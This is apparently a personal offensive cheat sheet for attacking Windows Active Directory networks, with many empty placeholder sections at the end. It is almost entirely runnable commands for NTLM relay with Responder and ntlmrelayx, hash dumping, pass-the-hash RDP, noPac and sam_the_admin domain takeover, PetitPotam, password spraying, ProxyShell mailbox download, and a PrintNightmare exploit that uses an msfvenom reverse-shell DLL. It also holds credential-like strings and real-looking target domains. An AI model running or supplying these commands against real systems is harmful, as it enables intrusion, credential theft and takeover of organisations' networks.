##### NTLM Relay attack #####

 modify on responder file /etc/responder/Responder.conf
SMB = Off  // Off instead of On
HTTP = Off  // Off instead of On

 Create a list of hosts within the environment with SMB signing disabled using crackmapexec

```bash
crackmapexec smb 172.19.0.0/16 --gen-relay-list targets.txt
wc -l targets.txt
```
 Fire up responeder to capture hashes

 ```bash
responder -I eth1 -r -d -w
```
 then fire up ntlmrelayx script to relay those hashes

 ```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -debug -socks
```
 After a while u can check ntlmrelayx if any session was captured
ntlmrelayx> socks
Protocol  Target         Username         AdminStatus  Port 
--------  -------- 	 --------         --------     ------
SMB       192.168.1.9    DOM/alice_admin  TRUE         445
SMB       192.168.1.16   DOM/alice_admin  TRUE         445
SMB       192.168.1.17   DOM/alice_admin  TRUE         445
SMB       192.168.1.13   DOM/alice_admin  TRUE         445
SMB       192.168.1.31   DOM/alice_admin  TRUE         445


 use proxychains to interact with ntlmrelayx socks fonctionality (1080 is the default port within ntlmrelayx)
nano /etc/proxychains.conf
[ProxyList]
socks4  127.0.0.1 1080


 Now you can basically do what ever with those sessions

  ```bash
proxychains impacket-smbclient -no-pass DOM/alice_admin@192.168.1.41
proxychains impacket-secretsdump DOM/alice_admin@192.168.1.4
impacket-secretsdump DOM/bob_admin@192.168.1.8
crackmapexec smb 192.168.1.10 -u dom_admin -p dom_admin_password -x whoami
```


##### CRACKMAPEXEC CMD #####

```bash 
with password :  crackmapexec smb 172.16.1.0/24 -u "user" -p "password" 

with hash :  crackmapexec smb 172.16.1.0/24 -u "user" -H "NTLM HASH"

LIST crackmapexec modules :  crackmapexec smb 172.16.1.0/24 -u "user" -p "password" -L 

run crackmapexec modules :  crackmapexec smb 172.16.1.0/24 -u "user" -p "password" -M 'MODULE'

```

##### SMB SHARES #####

```bash
without credentials : smbclient -L 172.16.1.0 

without credentials access : smbclient  \\\\172.16.1.0\\$share

with credentials : smbclient -L 172.16.1.0  -U=user%password

with credentials access : smbclient \\\\172.16.1.0\\$share  -U=user%password

with ntlm access : smbclient \\\\172.16.1.0\\$share -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local

mount smb share : sudo mkdir /tmp/data; sudo mount -t cifs -o 'user=USER,password=PASSWORD' //10.0.2.80/shareapp /tmp/data
```

##### PROXYSHELL #####

```bash
check exchange ssrf and get all emails : python3 Exchange_SSRF_Attacks.py --target mail.exchange.com --action Get

Search Mails And Download (include attachment) : python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchM --email userwantdown@exchange.com --keyword "password"

Download users emails : python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Download --email userwantdown@exchange.com
```

##### RDP #####

```bash
access with credentials : xfreerdp /u:"user" /p:"password" /v:172.16.1.36:3389 +clipboard /cert-ignore /size:1366x768 /smart-sizing

acess with ntlm : xfreerdp /u:"user" /pth:"ntlm" /v:172.16.1.36:3389 +clipboard /cert-ignore /size:1366x768 /smart-sizing

edit reg to login with the ntlm hash : REG add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

use crackmapexec (as admin) : crackmapexec smb 192.168.1.10 -u dom_admin -p dom_admin_password -x 'REG add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'

```

##### NOPAC #####

```bash
scanner : python scanner.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203

dump hashes : python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host eu.accor.net --impersonate administrator -dump

dump hashes : python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt

get shell : python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 -shell --impersonate administrator 
```

##### SAM THE HASH #####

```bash
get shell : python3 sam_the_admin.py "capvalue.ma/m.kassih:password" -dc-ip 172.16.15.105 -shell

dump hashes : python3 sam_the_admin.py "capvalue.ma/m.kassih:password" -dc-ip 172.16.15.105 -dump

```

##### PETITPOTAM #####

```bash
'https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/'

cmd 1 : sudo python3 ntlmrelayx.py -debug -smb2support --target http://pki.lab.local/certsrv/certfnsh.asp --adcs --template KerberosAuthentication

cmd 2 : python3 PetitPotam.py $attacker-ip $dc-ip  
```

##### BLOODHOUND #####

```bash

from terminal : bloodhound-python -u ned.flanders_adm -p 'Lefthandedyeah!' -d corp.local -ns 172.16.1.5 -c All -v



```

##### KERBRUTE #####

```bash

enum users : kerbrute userenum -d test.local usernames.txt

password spray : kerbrute passwordspray -d test.local domain_users.txt password123

brute user : kerbrute bruteuser -d test.local passwords.txt john

```

##### PrintNightmare #####

```bash
Scanning : rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR' (impacket)

range Scanning: cat hosts1.txt | while read line ;do echo "################# "$line" ##############"; rpcdump.py '@'$line | egrep 'MS-RPRN|MS-PAR' ; done | tee -a printnightmare.txt

generate dll reverse shell : msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.0.106 LPORT=4444 -f dll -o rev.dll

smbsever : python3 smbserver.py share $folder_to_share -smb2support 

Exploit with password: python3 CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'

Exploit with hash : python3 CVE-2021-1675.py hackit.local/domain_user@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' -hashes "NTLM-hash"
```

##### SCAN ALL NETWORK #####

```bash
scan : sudo nmap -v -oA ip-2.191 -sn 192.168.0.0/8

```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```

##### PLUS #####

```bash


```




